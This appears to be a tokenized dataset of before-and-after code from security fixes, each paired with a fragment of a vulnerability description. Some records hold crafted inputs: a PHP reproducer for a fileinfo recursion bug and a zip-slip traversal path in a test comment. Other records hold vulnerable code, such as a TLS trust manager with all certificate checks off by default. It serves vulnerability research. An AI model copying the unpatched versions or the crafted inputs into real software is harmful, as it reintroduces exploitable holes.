"return", "ret", ";", "if", "(", "SSL_get_srtp_profiles", "(", "s", ")", ")", "if", "(", "s", "-", ">", "srtp_profile", ")", "else", "if", "(", "type", "=", "=", "TLSEXT_TYPE_use_srtp", ")", "else", "if", "(", "type", "=", "=", "TLSEXT_TYPE_use_srtp", ")"], "docstring_tokens": ["sending", "multiple", "specially-crafted", "handshake", "messages"]}
{"contents": ["empty"], "code_tokens": ["#", "define", "UMH_KILLABLE", "4", "/", "*", "wait", "for", "EXEC", "/", "PROC", "killable", "*", "/", "struct", "completion", "*", "comp", "=", "xchg", "(", "&", "sub_info", "-", ">", "complete", ",", "NULL", ")", ";", "/", "*", "*", "See", "call_usermodehelper_exec", "(", ").", "If", "xchg", "(", ")", "returns", "NULL", "*", "we", "own", "sub_info", ",", "the", "UMH_KILLABLE", "caller", "has", "gone", "away", ".", "*", "/", "if", "(", "comp", ")", "complete", "(", "comp", ")", ";", "else", "call_usermodehelper_freeinfo", "(", "sub_info", ")", ";", "if", "(", "wait", "!", "=", "UMH_NO_WAIT", ")", "wait", "&", "=", "~", "UMH_KILLABLE", ";", "if", "(", "wait", "&", "UMH_KILLABLE", ")", "{", "retval", "=", "wait_for_completion_killable", "(", "&", "done", ")", ";", "if", "(", "!", "retval", ")", "goto", "wait_done", ";", "/", "*", "umh_complete", "(", ")", "will", "see", "NULL", "and", "free", "sub_info", "*", "/", "if", "(", "xchg", "(", "&", "sub_info", "-", ">", "complete", ",", "NULL", ")", ")", "goto", "unlock", ";", "/", "*", "fallthrough", ",", "umh_complete", "(", ")", "was", "already", "called", "*", "/", "}", "wait_done", ":</s>complete", "(", "sub_info", "-", ">", "complete", ")", ";"], "docstring_tokens": ["via", "a", "crafted", "application", "."]}
{"contents": ["empty"], "code_tokens": ["(", "size_t", ")", "(", "utf8_end", "-", "utf8_buf", ")", ",", "0", ",", "TEXTTEST", ",", "text", ")", ")", "=", "=", "0", ")", "size_t", ",", "int", ",", "int", ")", ";", "if", "(", "(", "m", "=", "file_softmagic", "(", "ms", ",", "ubuf", ",", "nb", ",", "0", ",", "BINTEST", ",", "size_t", "level", ",", "int", "mode", ",", "int", "text", ")", "text", ",", "0", ",", "level", ",", "&", "printed_something", ",", "&", "need_separator", ",", "if", "(", "offset", "=", "=", "0", ")", "return", "0", ";", "recursion_level", ",", "BINTEST", ",", "text", ")", ";", "-", "-", "TEST", "-", "-", "Bug", "#", "66731", ":", "file", ":", "infinite", "recursion", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "if", "(", "!", "class_exists", "(", "'", "finfo", "'", "))", "die", "(", "'", "skip", "no", "fileinfo", "extension", "'", ");", "-", "-", "FILE", "-", "-", "<", "?", "php", "$", "fd", "=", "__DIR__", ".", "'/", "cve", "-", "2014", "-", "1943", ".", "data", "'", ";", "$", "fm", "=", "__DIR__", ".", "'/", "cve", "-", "2014", "-", "1943", ".", "magic", "'", ";", "$", "a", "=", "\"", "\\", "105", "\\", "122", "\\", "000", "\\", "000", "\\", "000", "\\", "000", "\\", "000", "\"", ";", "$", "b", "=", "str_repeat", "(", "\"\\", "001", "\"", ",", "250000", ")", ";", "$", "m", "=", "\"", "0", "byte", "x", "\\", "n", "\"", ".", "\"", ">(", "1", ".", "b", ")", "indirect", "x", "\\", "n", "\"", ";", "file_put_contents", "(", "$", "fd", ",", "$", "a", ")", ";", "$", "fi", "=", "finfo_open", "(", "FILEINFO_NONE", ")", ";", "var_dump", "(", "finfo_file", "(", "$", "fi", ",", "$", "fd", ")", ");", "finfo_close", "(", "$", "fi", ")", ";", "file_put_contents", "(", "$", "fd", ",", "$", "b", ")", ";", "file_put_contents", "(", "$", "fm", ",", "$", "m", ")", ";", "$", "fi", "=", "finfo_open", "(", "FILEINFO_NONE", ",", "$", "fm", ")", ";", "var_dump", "(", "finfo_file", "(", "$", "fi", ",", "$", "fd", ")", ");", "finfo_close", "(", "$", "fi", ")", ";", "?", ">", "Done", "-", "-", "CLEAN", "-", "-", "<", "?", "php", "@", "unlink", "(", "__DIR__", ".", "'/", "cve", "-", "2014", "-", "1943", ".", "data", "'", ");", "@", "unlink", "(", "__DIR__", ".", "'/", "cve", "-", "2014", "-", "1943", ".", "magic", "'", ");", "?", ">", "-", "-", "EXPECTF", "-", "-", "string", "(", "%", "d", ")", "\"", "%", "s", "\"", "Warning", ":", "finfo_file", "(", "):", "Failed", "identify", "data", "0", ":", "(", "null", ")", "in", "%", "s", "on", "line", "%", "d", "bool", "(", "false", ")", "Done</s>(", "size_t", ")", "(", "utf8_end", "-", "utf8_buf", ")", ",", "TEXTTEST", ",", "text", ")", ")", "=", "=", "0", ")", "int", ",", "int", ")", ";", "if", "(", "(", "m", "=", "file_softmagic", "(", "ms", ",", "ubuf", ",", "nb", ",", "BINTEST", ",", "int", "mode", ",", "int", "text", ")", "text", ",", "0", ",", "0", ",", "&", "printed_something", ",", "&", "need_separator", ",", "BINTEST", ",", "text", ")", ";"], "docstring_tokens": ["attempts", "to", "classify", "file", "system", "objects", "based", "on", "filesystem"]}
{"contents": ["empty"], "code_tokens": ["/", "*", "If", "we", "see", "the", "relative", "traversal", "string", "of", "\"", "..", "\"", "we", "need", "to", "make", "sure", "*", "that", "the", "outputdir", "+", "name", "doesn", "'", "t", "leave", "the", "outputdir", ".", "See", "*", "DirectoryTraversalMaliciousTest", "for", "details", ".", "*", "/", "if", "(", "name", ".", "indexOf", "(", "\".", ".\"", ")", "!", "=", "-", "1", "&", "&", "!", "file", ".", "getCanonicalPath", "(", ").", "startsWith", "(", "outputDir", ".", "getCanonicalPath", "(", "))", ")", "{", "throw", "new", "ZipException", "(", "\"", "The", "file", "\"", "+", "name", "+", "\"", "is", "trying", "to", "leave", "the", "target", "output", "directory", "of", "\"", "+", "outputDir", "+", "\".", "Ignoring", "this", "file", ".", "\")", ";", "}", "/", "*", "If", "we", "see", "the", "relative", "traversal", "string", "of", "\"", "..", "\"", "we", "need", "to", "make", "sure", "*", "that", "the", "outputdir", "+", "name", "doesn", "'", "t", "leave", "the", "outputdir", ".", "See", "*", "DirectoryTraversalMaliciousTest", "for", "details", ".", "*", "/", "if", "(", "name", ".", "indexOf", "(", "\".", ".\"", ")", "!", "=", "-", "1", "&", "&", "!", "destFile", ".", "getCanonicalPath", "(", ").", "startsWith", "(", "outputDir", ".", "getCanonicalPath", "(", "))", ")", "{", "throw", "new", "ZipException", "(", "\"", "The", "file", "\"", "+", "name", "+", "\"", "is", "trying", "to", "leave", "the", "target", "output", "directory", "of", "\"", "+", "outputDir", "+", "\".", "Ignoring", "this", "file", ".", "\")", ";", "}", "/", "*", "If", "we", "see", "the", "relative", "traversal", "string", "of", "\"", "..", "\"", "we", "need", "to", "make", "sure", "*", "that", "the", "outputdir", "+", "name", "doesn", "'", "t", "leave", "the", "outputdir", ".", "See", "*", "DirectoryTraversalMaliciousTest", "for", "details", ".", "*", "/", "if", "(", "name", ".", "indexOf", "(", "\".", ".\"", ")", "!", "=", "-", "1", "&", "&", "!", "destFile", ".", "getCanonicalPath", "(", ").", "startsWith", "(", "outputDir", ".", "getCanonicalPath", "(", "))", ")", "{", "throw", "new", "ZipException", "(", "\"", "The", "file", "\"", "+", "name", "+", "\"", "is", "trying", "to", "leave", "the", "target", "output", "directory", "of", "\"", "+", "outputDir", "+", "\".", "Ignoring", "this", "file", ".", "\")", ";", "}", "/", "*", "If", "we", "see", "the", "relative", "traversal", "string", "of", "\"", "..", "\"", "we", "need", "to", "make", "sure", "*", "that", "the", "outputdir", "+", "name", "doesn", "'", "t", "leave", "the", "outputdir", ".", "See", "*", "DirectoryTraversalMaliciousTest", "for", "details", ".", "*", "/", "if", "(", "name", ".", "indexOf", "(", "\".", ".\"", ")", "!", "=", "-", "1", "&", "&", "!", "file", ".", "getCanonicalPath", "(", ").", "startsWith", "(", "outputDir", ".", "getCanonicalPath", "(", "))", ")", "{", "throw", "new", "ZipException", "(", "\"", "The", "file", "\"", "+", "name", "+", "\"", "is", "trying", "to", "leave", "the", "target", "output", "directory", "of", "\"", "+", "outputDir", "+", "\".", "Ignoring", "this", "file", ".", "\")", ";", "}", "package", "org", ".", "zeroturnaround", ".", "zip", ";", "/", "**", "*", "Copyright", "(", "C", ")", "2012", "ZeroTurnaround", "LLC", "<", "support", "@", "zeroturnaround", ".", "com", ">", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "import", "java", ".", "io", ".", "File", ";", "import", "junit", ".", "framework", ".", "TestCase", ";", "public", "class", "DirectoryTraversalMaliciousTest", "extends", "TestCase", "{", "/", "*", "*", "This", "is", "the", "contents", "of", "the", "file", ".", "There", "is", "one", "evil", "file", "that", "tries", "to", "get", "out", "of", "the", "*", "target", ".", "*", "*", "$", "unzip", "-", "t", "zip", "-", "slip", ".", "zip", "*", "Archive", ":", "zip", "-", "slip", ".", "zip", "*", "testing", ":", "good", ".", "txt", "OK", "*", "testing", ":", ".", "./", "..", "/.", "./", "..", "/.", "./", "..", "/.", "./", "..", "/.", "./", "..", "/.", "./", "..", "/.", "./", "..", "/.", "./", "..", "/.", "./", "..", "/.", "./", "..", "/.", "./", "..", "/.", "./", "..", "/.", "./", "..", "/.", "./", "..", "/.", "./", "..", "/.", "./", "..", "/.", "./", "..", "/.", "./", "..", "/.", "./", "..", "/.", "./", "..", "/", "tmp", "/", "evil", ".", "txt", "OK", "*", "No", "errors", "detected", "in", "compressed", "data", "of", "zip", "-", "slip", ".", "zip", ".", "*", "/", "private", "static", "final", "File", "badFile", "=", "new", "File", "(", "\"", "src", "/", "test", "/", "resources", "/", "zip", "-", "malicious", "-", "traversal", ".", "zip", "\"", ");", "private", "static", "final", "File", "badFileBackslashes", "=", "new", "File", "(", "\"", "src", "/", "test", "/", "resources", "/", "zip", "-", "malicious", "-", "traversal", "-", "backslashes", ".", "zip", "\"", ");", "public", "void", "testUnpackDoesntLeaveTarget", "(", ")", "throws", "Exception", "{", "File", "file", "=", "File", ".", "createTempFile", "(", "\"", "temp", "\"", ",", "null", ")", ";", "File", "tmpDir", "=", "file", ".", "getParentFile", "(", ");", "try", "{", "ZipUtil", ".", "unpack", "(", "badFile", ",", "tmpDir", ")", ";", "fail", "(", ");", "}", "catch", "(", "ZipException", "e", ")", "{", "assertTrue", "(", "true", ")", ";", "}", "}", "public", "void", "testUnwrapDoesntLeaveTarget", "(", ")", "throws", "Exception", "{", "File", "file", "=", "File", ".", "createTempFile", "(", "\"", "temp", "\"", ",", "null", ")", ";", "File", "tmpDir", "=", "file", ".", "getParentFile", "(", ");", "try", "{", "ZipUtil", ".", "iterate", "(", "badFileBackslashes", ",", "new", "ZipUtil", ".", "BackslashUnpacker", "(", "tmpDir", ")", ");", "fail", "(", ");", "}", "catch", "(", "ZipException", "e", ")", "{", "assertTrue", "(", "true", ")", ";", "}", "}", "}</s>"], "docstring_tokens": ["write", "to", "arbitrary", "files", "on", "the", "system"]}
{"contents": ["empty"], "code_tokens": ["661", ":", "sethi", "%", "hi", "(", "_PAGE_EXEC_4U", ")", ",", "%", "g4", "andcc", "%", "g5", ",", "%", "g4", ",", "%", "g0", ".", "section", ".", "sun4v_2insn_patch", ",", "\"", "ax", "\"", "nop</s>661", ":", "andcc", "%", "g5", ",", "_PAGE_EXEC_4U", ",", "%", "g0", ".", "section", ".", "sun4v_1insn_patch", ",", "\"", "ax", "\""], "docstring_tokens": ["using", "a", "specially-crafted", "application"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "len", "<", "EVP_GCM_TLS_EXPLICIT_IV_LEN", ")", "return", "0", ";", "if", "(", "!", "EVP_CIPHER_CTX_encrypting", "(", "c", ")", ")", "{", "if", "(", "len", "<", "EVP_GCM_TLS_TAG_LEN", ")", "return", "0", ";", "}", "if", "(", "len", "<", "EVP_CCM_TLS_EXPLICIT_IV_LEN", ")", "return", "0", ";", "if", "(", "!", "EVP_CIPHER_CTX_encrypting", "(", "c", ")", ")", "{", "if", "(", "len", "<", "cctx", "-", ">", "M", ")", "return", "0", ";", "}", "if", "(", "len", "<", "POLY1305_BLOCK_SIZE", ")", "return", "0", ";", "*", "merge", "record", "sequence", "number", "as", "per", "RFC7905</s>if", "(", "!", "EVP_CIPHER_CTX_encrypting", "(", "c", ")", ")", "if", "(", "!", "EVP_CIPHER_CTX_encrypting", "(", "c", ")", ")", "*", "merge", "record", "sequence", "number", "as", "per", "*", "draft", "-", "ietf", "-", "tls", "-", "chacha20", "-", "poly1305", "-", "03"], "docstring_tokens": ["sending", "specially", "crafted", "truncated", "packets"]}
{"contents": ["empty"], "code_tokens": ["USB_DT_OTG", ",", "(", "void", "*", "*)", "&", "desc", ",", "sizeof", "(", "*", "desc", ")", ");", "unsigned", "char", "type", ",", "void", "*", "*", "ptr", ",", "size_t", "minsize", ")", "if", "(", "header", "-", ">", "bLength", "<", "2", "|", "|", "header", "-", ">", "bLength", ">", "size", ")", "{", "if", "(", "header", "-", ">", "bDescriptorType", "=", "=", "type", "&", "&", "header", "-", ">", "bLength", ">", "=", "minsize", ")", "{", "USB_DT_SECURITY", ",", "(", "void", "*", "*)", "&", "secd", ",", "sizeof", "(", "*", "secd", ")", ");", "unsigned", "char", "type", ",", "void", "*", "*", "ptr", ",", "size_t", "min", ")", ";", "type", ",", "(", "void", "*", "*)", "ptr", ",", "sizeof", "(", "**", "(", "ptr", ")", "))</s>USB_DT_OTG", ",", "(", "void", "*", "*)", "&", "desc", ")", ";", "unsigned", "char", "type", ",", "void", "*", "*", "ptr", ")", "if", "(", "header", "-", ">", "bLength", "<", "2", ")", "{", "if", "(", "header", "-", ">", "bDescriptorType", "=", "=", "type", ")", "{", "USB_DT_SECURITY", ",", "(", "void", "*", "*)", "&", "secd", ")", ";", "unsigned", "char", "type", ",", "void", "*", "*", "ptr", ")", ";", "type", ",", "(", "void", "*", "*)", "ptr", ")"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["import", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "oauth2", ".", "common", ".", "OAuthPermission", ";", "import", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "oidc", ".", "utils", ".", "OidcUtils", ";", "/", "/", "Check", "the", "access", "token", "has", "the", "\"", "openid", "\"", "scope", "if", "(", "!", "oauth", ".", "getPermissions", "(", ").", "stream", "(", ")", ".", "map", "(", "OAuthPermission", ":", ":", "getPermission", ")", ".", "anyMatch", "(", "OidcUtils", ".", "OPENID_SCOPE", ":", ":", "equals", ")", ")", "{", "Response", ".", "status", "(", "401", ")", ";", "}</s>"], "docstring_tokens": ["obtaining", "the", "authorization", "code", "issued", "to", "another", "client"]}
{"contents": ["empty"], "code_tokens": ["msg", "-", ">", "msg_namelen", "=", "0", ";</s>"], "docstring_tokens": ["using", "recvmsg(2)/recvfrom(2)"]}
{"contents": ["empty"], "code_tokens": ["long", "writeTimeout", "=", "handler", ".", "getProtocol", "(", ").", "getStreamWriteTimeout", "(", ");", "if", "(", "writeTimeout", "<", "0", ")", "{", "wait", "(", ");", "}", "else", "{", "wait", "(", "writeTimeout", ")", ";", "}", "long", "readTimeout", "=", "handler", ".", "getProtocol", "(", ").", "getStreamReadTimeout", "(", ");", "if", "(", "readTimeout", "<", "0", ")", "{", "inBuffer", ".", "wait", "(", ");", "}", "else", "{", "inBuffer", ".", "wait", "(", "readTimeout", ")", ";", "}</s>wait", "(", "handler", ".", "getProtocol", "(", ").", "getStreamWriteTimeout", "(", "))", ";", "inBuffer", ".", "wait", "(", "handler", ".", "getProtocol", "(", ").", "getStreamReadTimeout", "(", "))", ";"], "docstring_tokens": ["sending", "excessive", "SETTINGS", "frames"]}
{"contents": ["empty"], "code_tokens": ["context", ".", "init", "(", "kms", ",", "null", ",", "new", "java", ".", "security", ".", "SecureRandom", "(", "))", ";</s>import", "java", ".", "io", ".", "File", ";", "private", "String", "truststorePath", ";", "private", "String", "truststoreType", ";", "private", "String", "truststorePassword", ";", "private", "boolean", "verifyChainEnabled", "=", "false", ";", "private", "boolean", "verifyRootCAEnabled", "=", "false", ";", "private", "boolean", "selfSignedCertificateEnabled", "=", "false", ";", "private", "boolean", "expiredCertificatesCheckEnabled", "=", "false", ";", "private", "boolean", "notMatchingDomainCheckEnabled", "=", "false", ";", "/", "/", "Build", "the", "default", "path", "to", "the", "cacert", "truststore", "file", ".", "By", "default", "we", "are", "/", "/", "going", "to", "use", "the", "file", "located", "in", "$", "JREHOME", "/", "lib", "/", "security", "/", "cacerts", ".", "String", "javaHome", "=", "System", ".", "getProperty", "(", "\"", "java", ".", "home", "\"", ");", "StringBuilder", "buffer", "=", "new", "StringBuilder", "(", ");", "buffer", ".", "append", "(", "javaHome", ")", ".", "append", "(", "File", ".", "separator", ")", ".", "append", "(", "\"", "lib", "\"", ");", "buffer", ".", "append", "(", "File", ".", "separator", ")", ".", "append", "(", "\"", "security", "\"", ");", "buffer", ".", "append", "(", "File", ".", "separator", ")", ".", "append", "(", "\"", "cacerts", "\"", ");", "truststorePath", "=", "buffer", ".", "toString", "(", ");", "/", "/", "Set", "the", "default", "store", "type", "truststoreType", "=", "\"", "jks", "\"", ";", "/", "/", "Set", "the", "default", "password", "of", "the", "cacert", "file", "that", "is", "\"", "changeit", "\"", "truststorePassword", "=", "\"", "changeit", "\"", ";", "/", "**", "*", "Retuns", "the", "path", "to", "the", "trust", "store", "file", ".", "The", "trust", "store", "file", "contains", "the", "root", "*", "certificates", "of", "several", "well", "known", "CAs", ".", "By", "default", ",", "will", "attempt", "to", "use", "the", "*", "the", "file", "located", "in", "$", "JREHOME", "/", "lib", "/", "security", "/", "cacerts", ".", "*", "*", "@", "return", "the", "path", "to", "the", "truststore", "file", ".", "*", "/", "public", "String", "getTruststorePath", "(", ")", "{", "return", "truststorePath", ";", "}", "/", "**", "*", "Sets", "the", "path", "to", "the", "trust", "store", "file", ".", "The", "truststore", "file", "contains", "the", "root", "*", "certificates", "of", "several", "well", "?", "known", "CAs", ".", "By", "default", "Smack", "is", "going", "to", "use", "*", "the", "file", "located", "in", "$", "JREHOME", "/", "lib", "/", "security", "/", "cacerts", ".", "*", "*", "@", "param", "truststorePath", "the", "path", "to", "the", "truststore", "file", ".", "*", "/", "public", "void", "setTruststorePath", "(", "String", "truststorePath", ")", "{", "this", ".", "truststorePath", "=", "truststorePath", ";", "}", "/", "**", "*", "Returns", "the", "trust", "store", "type", ",", "or", "<", "tt", ">", "null", "<", "/", "tt", ">", "if", "it", "'", "s", "not", "set", ".", "*", "*", "@", "return", "the", "trust", "store", "type", ".", "*", "/", "public", "String", "getTruststoreType", "(", ")", "{", "return", "truststoreType", ";", "}", "/", "**", "*", "Sets", "the", "trust", "store", "type", ".", "*", "*", "@", "param", "truststoreType", "the", "trust", "store", "type", ".", "*", "/", "public", "void", "setTruststoreType", "(", "String", "truststoreType", ")", "{", "this", ".", "truststoreType", "=", "truststoreType", ";", "}", "/", "**", "*", "Returns", "the", "password", "to", "use", "to", "access", "the", "trust", "store", "file", ".", "It", "is", "assumed", "that", "all", "*", "certificates", "share", "the", "same", "password", "in", "the", "trust", "store", ".", "*", "*", "@", "return", "the", "password", "to", "use", "to", "access", "the", "truststore", "file", ".", "*", "/", "public", "String", "getTruststorePassword", "(", ")", "{", "return", "truststorePassword", ";", "}", "/", "**", "*", "Sets", "the", "password", "to", "use", "to", "access", "the", "trust", "store", "file", ".", "It", "is", "assumed", "that", "all", "*", "certificates", "share", "the", "same", "password", "in", "the", "trust", "store", ".", "*", "*", "@", "param", "truststorePassword", "the", "password", "to", "use", "to", "access", "the", "truststore", "file", ".", "*", "/", "public", "void", "setTruststorePassword", "(", "String", "truststorePassword", ")", "{", "this", ".", "truststorePassword", "=", "truststorePassword", ";", "}", "/", "**", "*", "Returns", "true", "if", "the", "whole", "chain", "of", "certificates", "presented", "by", "the", "server", "are", "going", "to", "*", "be", "checked", ".", "By", "default", "the", "certificate", "chain", "is", "not", "verified", ".", "*", "*", "@", "return", "true", "if", "the", "whole", "chaing", "of", "certificates", "presented", "by", "the", "server", "are", "going", "to", "*", "be", "checked", ".", "*", "/", "public", "boolean", "isVerifyChainEnabled", "(", ")", "{", "return", "verifyChainEnabled", ";", "}", "/", "**", "*", "Sets", "if", "the", "whole", "chain", "of", "certificates", "presented", "by", "the", "server", "are", "going", "to", "*", "be", "checked", ".", "By", "default", "the", "certificate", "chain", "is", "not", "verified", ".", "*", "*", "@", "param", "verifyChainEnabled", "if", "the", "whole", "chaing", "of", "certificates", "presented", "by", "the", "server", "*", "are", "going", "to", "be", "checked", ".", "*", "/", "public", "void", "setVerifyChainEnabled", "(", "boolean", "verifyChainEnabled", ")", "{", "this", ".", "verifyChainEnabled", "=", "verifyChainEnabled", ";", "}", "/", "**", "*", "Returns", "true", "if", "root", "CA", "checking", "is", "going", "to", "be", "done", ".", "By", "default", "checking", "is", "disabled", ".", "*", "*", "@", "return", "true", "if", "root", "CA", "checking", "is", "going", "to", "be", "done", ".", "*", "/", "public", "boolean", "isVerifyRootCAEnabled", "(", ")", "{", "return", "verifyRootCAEnabled", ";", "}", "/", "**", "*", "Sets", "if", "root", "CA", "checking", "is", "going", "to", "be", "done", ".", "By", "default", "checking", "is", "disabled", ".", "*", "*", "@", "param", "verifyRootCAEnabled", "if", "root", "CA", "checking", "is", "going", "to", "be", "done", ".", "*", "/", "public", "void", "setVerifyRootCAEnabled", "(", "boolean", "verifyRootCAEnabled", ")", "{", "this", ".", "verifyRootCAEnabled", "=", "verifyRootCAEnabled", ";", "}", "/", "**", "*", "Returns", "true", "if", "self", "-", "signed", "certificates", "are", "going", "to", "be", "accepted", ".", "By", "default", "*", "this", "option", "is", "disabled", ".", "*", "*", "@", "return", "true", "if", "self", "-", "signed", "certificates", "are", "going", "to", "be", "accepted", ".", "*", "/", "public", "boolean", "isSelfSignedCertificateEnabled", "(", ")", "{", "return", "selfSignedCertificateEnabled", ";", "}", "/", "**", "*", "Sets", "if", "self", "-", "signed", "certificates", "are", "going", "to", "be", "accepted", ".", "By", "default", "*", "this", "option", "is", "disabled", ".", "*", "*", "@", "param", "selfSignedCertificateEnabled", "if", "self", "-", "signed", "certificates", "are", "going", "to", "be", "accepted", ".", "*", "/", "public", "void", "setSelfSignedCertificateEnabled", "(", "boolean", "selfSignedCertificateEnabled", ")", "{", "this", ".", "selfSignedCertificateEnabled", "=", "selfSignedCertificateEnabled", ";", "}", "/", "**", "*", "Returns", "true", "if", "certificates", "presented", "by", "the", "server", "are", "going", "to", "be", "checked", "for", "their", "*", "validity", ".", "By", "default", "certificates", "are", "not", "verified", ".", "*", "*", "@", "return", "true", "if", "certificates", "presented", "by", "the", "server", "are", "going", "to", "be", "checked", "for", "their", "*", "validity", ".", "*", "/", "public", "boolean", "isExpiredCertificatesCheckEnabled", "(", ")", "{", "return", "expiredCertificatesCheckEnabled", ";", "}", "/", "**", "*", "Sets", "if", "certificates", "presented", "by", "the", "server", "are", "going", "to", "be", "checked", "for", "their", "*", "validity", ".", "By", "default", "certificates", "are", "not", "verified", ".", "*", "*", "@", "param", "expiredCertificatesCheckEnabled", "if", "certificates", "presented", "by", "the", "server", "are", "going", "*", "to", "be", "checked", "for", "their", "validity", ".", "*", "/", "public", "void", "setExpiredCertificatesCheckEnabled", "(", "boolean", "expiredCertificatesCheckEnabled", ")", "{", "this", ".", "expiredCertificatesCheckEnabled", "=", "expiredCertificatesCheckEnabled", ";", "}", "/", "**", "*", "Returns", "true", "if", "certificates", "presented", "by", "the", "server", "are", "going", "to", "be", "checked", "for", "their", "*", "domain", ".", "By", "default", "certificates", "are", "not", "verified", ".", "*", "*", "@", "return", "true", "if", "certificates", "presented", "by", "the", "server", "are", "going", "to", "be", "checked", "for", "their", "*", "domain", ".", "*", "/", "public", "boolean", "isNotMatchingDomainCheckEnabled", "(", ")", "{", "return", "notMatchingDomainCheckEnabled", ";", "}", "/", "**", "*", "Sets", "if", "certificates", "presented", "by", "the", "server", "are", "going", "to", "be", "checked", "for", "their", "*", "domain", ".", "By", "default", "certificates", "are", "not", "verified", ".", "*", "*", "@", "param", "notMatchingDomainCheckEnabled", "if", "certificates", "presented", "by", "the", "server", "are", "going", "*", "to", "be", "checked", "for", "their", "domain", ".", "*", "/", "public", "void", "setNotMatchingDomainCheckEnabled", "(", "boolean", "notMatchingDomainCheckEnabled", ")", "{", "this", ".", "notMatchingDomainCheckEnabled", "=", "notMatchingDomainCheckEnabled", ";", "}", "/", "**", "*", "$", "RCSfile", "$", "*", "$", "Revision", "$", "*", "$", "Date", "$", "*", "*", "Copyright", "2003", "-", "2005", "Jive", "Software", ".", "*", "*", "All", "rights", "reserved", ".", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "jivesoftware", ".", "smack", ";", "import", "javax", ".", "net", ".", "ssl", ".", "X509TrustManager", ";", "import", "java", ".", "io", ".", "FileInputStream", ";", "import", "java", ".", "io", ".", "InputStream", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "security", ".", "*;", "import", "java", ".", "security", ".", "cert", ".", "CertificateException", ";", "import", "java", ".", "security", ".", "cert", ".", "CertificateParsingException", ";", "import", "java", ".", "security", ".", "cert", ".", "X509Certificate", ";", "import", "java", ".", "util", ".", "*;", "import", "java", ".", "util", ".", "logging", ".", "Logger", ";", "import", "java", ".", "util", ".", "regex", ".", "Matcher", ";", "import", "java", ".", "util", ".", "regex", ".", "Pattern", ";", "/", "**", "*", "Trust", "manager", "that", "checks", "all", "certificates", "presented", "by", "the", "server", ".", "This", "class", "*", "is", "used", "during", "TLS", "negotiation", ".", "It", "is", "possible", "to", "disable", "/", "enable", "some", "or", "all", "checkings", "*", "by", "configuring", "the", "{", "@", "link", "ConnectionConfiguration", "}", ".", "The", "truststore", "file", "that", "contains", "*", "knows", "and", "trusted", "CA", "root", "certificates", "can", "also", "be", "configure", "in", "{", "@", "link", "ConnectionConfiguration", "}", ".", "*", "*", "@", "author", "Gaston", "Dombiak", "*", "/", "class", "ServerTrustManager", "implements", "X509TrustManager", "{", "private", "static", "Logger", "log", "=", "Logger", ".", "getLogger", "(", "ServerTrustManager", ".", "class", ".", "getName", "(", "))", ";", "private", "static", "Pattern", "cnPattern", "=", "Pattern", ".", "compile", "(", "\"(", "?", "i", ")", "(", "cn", "=", ")(", "[^", ",]", "*)", "\")", ";", "private", "ConnectionConfiguration", "configuration", ";", "/", "**", "*", "Holds", "the", "domain", "of", "the", "remote", "server", "we", "are", "trying", "to", "connect", "*", "/", "private", "String", "server", ";", "private", "KeyStore", "trustStore", ";", "private", "static", "Map", "<", "KeyStoreOptions", ",", "KeyStore", ">", "stores", "=", "new", "HashMap", "<", "KeyStoreOptions", ",", "KeyStore", ">", "()", ";", "public", "ServerTrustManager", "(", "String", "server", ",", "ConnectionConfiguration", "configuration", ")", "{", "this", ".", "configuration", "=", "configuration", ";", "this", ".", "server", "=", "server", ";", "InputStream", "in", "=", "null", ";", "char", "[", "]", "password", "=", "null", ";", "synchronized", "(", "stores", ")", "{", "KeyStoreOptions", "options", "=", "new", "KeyStoreOptions", "(", "configuration", ".", "getTruststoreType", "(", "),", "configuration", ".", "getTruststorePath", "(", "),", "configuration", ".", "getTruststorePassword", "(", "))", ";", "if", "(", "stores", ".", "containsKey", "(", "options", ")", ")", "{", "trustStore", "=", "stores", ".", "get", "(", "options", ")", ";", "}", "else", "{", "try", "{", "trustStore", "=", "KeyStore", ".", "getInstance", "(", "options", ".", "getType", "(", "))", ";", "if", "(", "options", ".", "getPassword", "(", ")", "!", "=", "null", ")", "{", "password", "=", "options", ".", "getPassword", "(", ").", "toCharArray", "(", ");", "}", "if", "(", "options", ".", "getPath", "(", ")", "=", "=", "null", ")", "{", "trustStore", ".", "load", "(", "null", ",", "password", ")", ";", "}", "else", "{", "in", "=", "new", "FileInputStream", "(", "options", ".", "getPath", "(", "))", ";", "trustStore", ".", "load", "(", "in", ",", "password", ")", ";", "}", "}", "catch", "(", "Exception", "e", ")", "{", "trustStore", "=", "null", ";", "e", ".", "printStackTrace", "(", ");", "}", "finally", "{", "if", "(", "in", "!", "=", "null", ")", "{", "try", "{", "in", ".", "close", "(", 